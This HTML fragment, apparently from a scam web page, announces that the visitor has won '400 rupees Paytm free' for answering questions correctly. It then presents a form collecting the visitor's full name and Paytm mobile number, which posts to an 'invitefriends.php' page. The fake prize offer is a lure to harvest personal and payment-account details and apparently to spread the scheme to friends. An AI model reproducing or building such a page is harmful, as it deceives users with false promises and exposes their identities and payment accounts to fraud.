...
<div class="ril-step adtop" >            <span class="s-padding">Note </span>            <p class="s-padding">You have given correct answers to all the questions, so you get 400 rupees Paytm free. </p>            <p class="s-padding">                Follow the instructions to Get Paytm            </p>        <p class="s-padding">       </p>                     </div>

      <div class="form-step">
            <form method="post" action="invitefriends.php" id="submitForm">
               
<label>Enter Your Full Name<font color="red">*</font></label>
<input id="name" type="text" ng-class="nameError ? 'error-border':''" ng-model="text" ng-blur="hasPreviousOrders = false;" ng-focus="getPreviousOrders()" name="fname" method=POST action=invitefriends.html  autocomplete="off" text-only="text-only" placeholder="Enter Your Full Name" class="textbox1" required>
				
                <label>Paytm No.<font color="red">*</font></label>
                <input name="mobile" class="textbox1" type="number"  id="mobile" maxlength="10" placeholder="Enter Your Paytm Number"
				required>
